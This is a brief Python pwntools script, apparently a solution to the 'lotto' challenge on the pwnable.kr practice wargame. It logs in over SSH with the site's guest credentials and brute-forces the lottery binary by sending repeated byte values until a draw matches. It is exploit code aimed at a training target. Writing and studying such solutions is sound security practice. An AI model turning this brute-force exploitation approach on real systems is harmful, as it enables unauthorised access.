#!/usr/bin/env python

from pwn import *

sh = ssh(host='pwnable.kr',user='lotto',password='guest',port=2222)
proc = sh.process("/home/lotto/lotto")

print proc.recv()

for i in range(1,46):
	proc.sendline('1')
	proc.recv()
	message = ''
	for j in range(6):
		message = message + chr(i)
	proc.sendline(message)
	res = proc.recv()
	print res
	if 'bad luck' not in res:
		print res	
